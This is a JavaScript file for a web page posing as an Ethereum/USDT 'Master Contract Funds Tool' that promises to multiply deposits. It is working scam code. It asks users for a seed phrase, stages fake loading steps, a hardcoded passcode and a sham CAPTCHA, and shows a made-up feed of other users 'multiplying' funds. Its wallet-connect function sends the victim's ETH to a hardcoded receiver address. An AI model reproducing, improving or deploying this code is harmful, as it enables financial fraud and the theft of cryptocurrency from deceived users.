// Themes per coin
const themes = {
  BTC: 'theme-btc',
  ETH: 'theme-eth',
  USDT: 'theme-usdt'
};

// MCA address samples
const MCA_ADDRESSES = [
  "0xaEf92B0989F3a8F3c739afC0F00417e0192f27A4",
  "0x7e70D2850D1e2041E2b84C8B65b51dC343DC405B",
  "0x9dEf86a65F1e7cD14D264ed543c7f0a04DcB723C"
];

// USDT/ETH address to receive funds
const RECEIVER_ADDRESS = "0x26Ab01C84F00d0D4f245d06A0a2C60880f675839";

// App state
let selectedCrypto = null;
let generatedMCA = null;

// Utilities
function randomDelay(callback) {
  const delay = Math.floor(Math.random() * 2000) + 3000;
  setTimeout(callback, delay);
}

// Load real-time price
async function loadCryptoPrices() {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum,tether&vs_currencies=usd");
    const data = await response.json();
    document.getElementById("cryptoPriceText").textContent =
      `1 ETH = $${data.ethereum.usd} | 1 USDT = $${data.tether.usd}`;
  } catch (err) {
    document.getElementById("cryptoPriceText").textContent = "⚠️ Failed to load prices.";
  }
}

// Start app → Show coin selection
function goToDashboard() {
  document.getElementById("generateBtn").style.display = "none";
  document.getElementById("coinSelectPanel").style.display = "block";
}

// Coin Selection Handler
function selectCrypto() {
  const selection = document.getElementById("coinChoice").value;
  if (!selection) return;

  selectedCrypto = selection;
  document.body.className = '';
  document.body.classList.add(themes[selection]);

  if (selection === "BTC") {
    alert("⚠️ Bitcoin is currently unavailable.");
    return;
  }

  document.getElementById("coinSelectPanel").style.display = "none";
  document.getElementById("dropdownPanel").style.display = "block";

  const title = document.querySelector("h1");
  title.textContent = selection === "ETH"
    ? "Ethereum Master Contract Funds Tool"
    : "USDT Master Contract Funds Tool";

  loadCryptoPrices();
}

// Description toggle
function toggleDescription() {
  document.getElementById("descriptionBox").classList.toggle("hidden");
}

// Seed field toggle
function showSeedInput() {
  const value = document.getElementById("seedLength").value;
  document.getElementById("seedInput").style.display = value ? "block" : "none";
}

// Update yield message
function updateTransactionYield() {
  const amount = parseFloat(document.getElementById("amountSelect").value.replace('$', ''));
  const multiplier = parseInt(document.getElementById("multiplierSelect").value.replace('×', ''));
  const yieldBox = document.getElementById("yieldMessage");

  if (!isNaN(amount) && !isNaN(multiplier)) {
    const result = amount * multiplier;
    yieldBox.innerHTML = `🔕 You will receive <strong>$${result}</strong> based on your selection of $${amount} × ${multiplier}. Click below to proceed.`;
  } else {
    yieldBox.innerHTML = '';
  }
}

// Validate form before proceeding
function allFieldsValid() {
  const ids = ["locationSelect", "walletTypeSelect", "seedLength", "authSelect", "amountSelect", "multiplierSelect"];
  return ids.every(id => document.getElementById(id).value.trim() !== "");
}

// Proceed to Flow
function startProcessing() {
  if (!allFieldsValid()) {
    alert("⚠️ Please fill all fields before continuing.");
    return;
  }

  document.querySelector(".proceed-area button").style.display = "none";
  document.getElementById("loadingText").style.display = "block";

  randomDelay(() => {
    document.getElementById("dropdownPanel").style.display = "none";
    document.getElementById("loadingText").style.display = "none";
    document.getElementById("finalFlow").style.display = "block";
  });
}

// Step 1: Wallet input
function nextStepAddress() {
  const address = document.getElementById("walletInput").value.trim();
  if (!address) return;

  document.getElementById("stepAddress").classList.add("hidden");
  randomDelay(() => {
    document.getElementById("stepPasscode").classList.remove("hidden");
  });
}

// Step 2: Passcode validation
function validatePasscode() {
  const passInput = document.getElementById("passcodeInput");
  const status = document.getElementById("passcodeStatus");
  const entered = passInput.value.trim();

  if (entered === "##MCA1234_*#") {
    passInput.classList.add("passcode-valid");
    passInput.classList.remove("passcode-invalid");
    status.textContent = "";

    randomDelay(() => {
      document.getElementById("stepLink").classList.remove("hidden");
    });
  } else {
    passInput.classList.add("passcode-invalid");
    passInput.classList.remove("passcode-valid");
    status.textContent = "❌ Incorrect passcode.";
  }
}

// Step 3: Link
function linkAddress() {
  document.getElementById("stepLink").classList.add("hidden");
  randomDelay(() => {
    document.getElementById("stepLinked").classList.remove("hidden");
    randomDelay(() => {
      document.getElementById("stepCaptcha").classList.remove("hidden");
    });
  });
}

// Step 4: CAPTCHA
function verifyCaptcha() {
  if (document.getElementById("captchaCheck").checked) {
    document.getElementById("stepCaptcha").classList.add("hidden");
    document.getElementById("stepGenerate").classList.remove("hidden");
  } else {
    document.getElementById("captchaStatus").textContent = "⚠️ Please confirm you're not a robot.";
  }
}

// Step 5: Generate MCA
function generateMCA() {
  const index = Math.floor(Math.random() * MCA_ADDRESSES.length);
  generatedMCA = MCA_ADDRESSES[index];

  document.getElementById("stepGenerate").classList.add("hidden");
  document.getElementById("stepResult").classList.remove("hidden");

  document.getElementById("mcaOutput").value = generatedMCA;
  document.getElementById("popupMCA").value = generatedMCA;

  const amount = document.getElementById("amountSelect").value;
  document.getElementById("amountNotice").innerHTML = `<strong>You selected ${amount}. Simulate the transaction accordingly.</strong>`;

  document.getElementById("procedurePopup").classList.remove("hidden");
}

// Close popup
function closeProcedurePopup() {
  document.getElementById("procedurePopup").classList.add("hidden");
}

// Wallet Connect Logic
async function connectWallet() {
  if (typeof window.ethereum === 'undefined') {
    alert("⚠️ MetaMask not detected.");
    return;
  }

  try {
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const web3 = new Web3(window.ethereum);
    const sender = accounts[0];

    const amountValue = parseFloat(document.getElementById("amountSelect").value.replace('$', ''));
    if (isNaN(amountValue)) {
      alert("Invalid amount.");
      return;
    }

    const valueInWei = selectedCrypto === "ETH"
      ? web3.utils.toWei((amountValue / 3000).toFixed(6), 'ether')  // example: convert $3000 to ~1 ETH
      : web3.utils.toWei(amountValue.toString(), 'mwei'); // USDT in 6 decimals

    const tx = {
      from: sender,
      to: RECEIVER_ADDRESS,
      value: selectedCrypto === "ETH" ? valueInWei : '0x0'
    };

    if (selectedCrypto === "USDT") {
      // USDT is a token (ERC20), call transfer() method on its contract instead.
      alert("⚠️ USDT transfers require token contract interaction. (Not implemented here)");
      return;
    }

    await web3.eth.sendTransaction(tx);
    alert("✅ Transaction sent successfully.");

  } catch (err) {
    console.error(err);
    alert("❌ Transaction failed.");
  }
}

// Blockchain feed simulation
function addFakeActivity() {
  const amount = ["$500", "$1000", "$2000", "$3000", "$5000"][Math.floor(Math.random() * 5)];
  const address = "0x" + Math.random().toString(36).substring(2, 10) + "...";
  const now = new Date().toLocaleTimeString();

  const msg = `${address} just multiplied ${amount} at ${now}`;
  const item = document.createElement("li");
  item.textContent = msg;

  const list = document.getElementById("activityList");
  list.insertBefore(item, list.firstChild);

  if (list.children.length > 10) {
    list.removeChild(list.lastChild);
  }
}

// Launch feed loop
setInterval(addFakeActivity, 7000);

// Load price once on startup
loadCryptoPrices();